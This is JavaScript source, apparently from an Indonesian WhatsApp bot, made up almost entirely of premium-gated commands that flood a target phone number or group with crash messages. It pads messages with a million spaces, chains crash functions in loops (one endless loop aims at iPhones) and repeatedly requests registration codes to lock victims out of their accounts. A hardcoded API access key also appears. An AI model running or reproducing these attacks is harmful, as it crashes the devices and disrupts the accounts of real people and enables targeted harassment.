case 'bug-loc': case 'bug-browser': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await afgan.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #afgannrorr"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⌜ DixzMenu ⌟', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-gc': case 'penghitaman': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #afgannrorr"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⌜ DixzMenu ⌟', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "check-host": {
if (!q) return reply (`Example : ${m.prefix + m.command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Klik Chech Host Untuk Untuk Memeriksa Web"
    },
    "footer": {
      "text": "AlwaysAfgann © AFGANN"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
afgan.relayMessage(m.chat, msg, {});
}
break

//=================================================//
case 'zero-bug': case 'bug-s': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'samsung-cache': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-rom': case 'restart-ui': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'virg4m': case 'bijibapakkau': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'temp-ban': {
if (!isPremium) return reply(mess.only.premium)
if (!text) return reply(`Example: ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break
//=================================================//
case 'cekprovider': {
if (!isPremium) return reply(mess.only.premium)
if (!text) return reply(`Example: ${prefix + command} 6287872627288`)
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
reply(JSON.stringify(result, null, 2));
} catch (error) {
reply(`Error: ${error.message}`);
}
}
break
case 'ios-24j': case 'vios-unli': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
await reply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await aipong(target)
    await aipong(target)
    await aipong(target)
    await aipong(target)
    await sleep(4000)
  }
}
break
//=================================================//
case 'bug-ios': case 'bug-ipong': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
reply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(3500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'kerupuk': case 'kelapir': case 'sendgas': case 'crashtotal': case 'anjir': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: '😈'}, {quoted:m})
afgan.sendMessage(Pe, {text: '😈'}, {quoted:m})
afgan.sendMessage(Pe, {text: '😈'}, {quoted:m})
afgan.sendMessage(Pe, {text: '😈'}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
case 'lokas1': case 'lokas2': case 'lokas3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { location : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { location : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { location : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { location : virgam,  caption: `${buttonafgan}` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
case 'doku1': case 'doku2': case 'doku3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { document : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { document : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { document : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { document : virgam,  caption: `${buttonafgan}` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'audio1': case 'audio2': case 'audio3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { audio : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { audio : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { audio : virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { audio : virgam,  caption: `${buttonafgan}` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'gasbugafgan': case 'oemji': case 'lawack': {
if (!isPremium) return reply(mess.only.premium)
if (!qtext) return m.reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
Pe = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await afgan.onWhatsApp(Pe)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'kontak1': case 'kontak2': case 'kontak3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { contact : virgam }, { quoted:m })
afgan.sendMessage(Pe, { contact : virgam }, { quoted:m })
afgan.sendMessage(Pe, { contact : virgam }, { quoted:m })
afgan.sendMessage(Pe, { contact : virgam }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'gambar1': case 'gambar2': case 'gambar3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { image: virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { image: virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { image: virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { image: virgam,  caption: `${buttonafgan}` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'video1': case 'video2': case 'video3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { video: virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { video: virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { video: virgam,  caption: `${buttonafgan}` }, { quoted:m })
afgan.sendMessage(Pe, { video: virgam,  caption: `${buttonafgan}` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break


case 'afgantop': case 'afgansepele': case 'afgananjay': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case '=.': {
if (!isOwner) return m.reply(`khusus bot doang`)
await m.reply(`crash dalam hitungan`)
await m.reply(`1`)
await m.reply(`2`)
await lokascrash(m.chat, afganrorr)
await virgamcrash(m.chat, afganrorr)
await dokucrash(m.chat, afganrorr)
await iponcrash(m.chat, afganrorr)
await iponcrash(m.chat)
await crashasu(m.chat, afganrorr)
await lokascrash(m.chat, afganrorr)
await virgamcrash(m.chat, afganrorr)
await dokucrash(m.chat, afganrorr)
await iponcrash(m.chat, afganrorr)
await iponcrash(m.chat)
await crashasu(m.chat, afganrorr)
afgan.sendMessage(m.chat, {text: `3`}, {quoted:m})
await lokascrash(m.chat, afganrorr)
await virgamcrash(m.chat, afganrorr)
await dokucrash(m.chat, afganrorr)
await iponcrash(m.chat, afganrorr)
await iponcrash(m.chat)
await crashasu(m.chat, afganrorr)
await m.reply(`done`)
}
break


case 'virtex1': case 'virtex2': case 'virtex3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: `${buttonafgan}`}, {quoted:m})
afgan.sendMessage(Pe, {text: `${buttonafgan}`}, {quoted:m})
afgan.sendMessage(Pe, {text: `${buttonafgan}`}, {quoted:m})
afgan.sendMessage(Pe, {text: `${buttonafgan}`}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break


case 'slayer07': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
afgan.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
